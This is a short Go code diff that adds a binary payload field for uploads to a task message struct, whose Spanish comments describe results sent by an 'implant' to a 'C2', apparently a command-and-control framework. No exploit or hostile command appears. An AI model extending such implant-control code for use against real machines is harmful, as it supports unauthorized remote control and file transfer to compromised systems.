@@ -7,6 +7,7 @@ type TaskWire struct {
 	ID      string   `json:"id"`
 	Command string   `json:"command"`
 	Args    []string `json:"args"`
+	Payload []byte   `json:"payload,omitempty"` // datos binarios (upload)
 }
 
 // TaskResultWire es el resultado de una tarea enviado por el implante al C2.
